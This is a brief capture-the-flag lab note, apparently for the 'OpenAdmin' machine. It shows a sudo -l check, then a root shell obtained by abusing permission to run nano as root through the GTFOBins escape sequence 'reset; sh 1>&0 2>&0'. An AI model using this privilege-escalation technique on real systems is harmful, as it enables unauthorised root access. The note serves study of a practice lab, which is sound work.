# User Joanna after sshing to her machine with decrypted id_rsa file 
## sudo -l to see what we can run as sudo. Low hanging fruit

```
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
joanna@openadmin:~$ 

```
- I can run nano as root but only with the file /opt/priv
	* opened the file `sudo nano /opt/priv`

- Now we need to gtfo
	* went online to gtfo bins, looked under nano 

```
nano
^R^X
reset; sh 1>&0 2>&0
```
- ^R^X are just ctrl+R and ctrl+X
	* able to execute a command now and type the next line after the commands in and we are givien a root shell
